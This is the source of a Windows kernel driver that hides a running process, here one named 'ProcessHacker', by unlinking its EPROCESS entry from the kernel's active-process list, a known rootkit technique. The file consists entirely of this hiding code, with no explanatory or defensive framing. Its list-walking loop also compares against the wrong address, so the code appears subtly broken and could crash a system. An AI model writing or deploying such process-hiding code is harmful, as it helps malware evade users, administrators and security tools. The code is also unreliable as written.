#include <ntddk.h> 
#include <nt.hpp> 

NTSTATUS DriverEntry(
  IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath
);

VOID Unload(
	IN PDRIVER_OBJECT DriverObject
);

VOID HideProcess(
  PCSTR ProcessName
); 

NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath)
{
	UNREFERENCED_PARAMETER(RegistryPath);

	DriverObject->DriverUnload = Unload;

	HideProcess("ProcessHacker");

	return STATUS_SUCCESS;
}

VOID Unload(_In_ PDRIVER_OBJECT DriverObject)
{
	UNREFERENCED_PARAMETER(DriverObject);
	DbgPrint("Driver Unloaded ...");
}

VOID HideProcess(PCSTR ProcessName)
{
	_PEPROCESS CurrentProcess = nullptr;

	for (PLIST_ENTRY ListEntry = PsInitialSystemProcess->ActiveProcessLinks.Flink;
		ListEntry != (PLIST_ENTRY)PsInitialSystemProcess; ListEntry = ListEntry->Flink)
	{
		CurrentProcess = CONTAINING_RECORD(ListEntry, _EPROCESS, ActiveProcessLinks);

		if (strstr((PCSTR)CurrentProcess->ImageFileName, ProcessName))
		{
			RemoveEntryList(&CurrentProcess->ActiveProcessLinks);
			break;
		}
	}
}
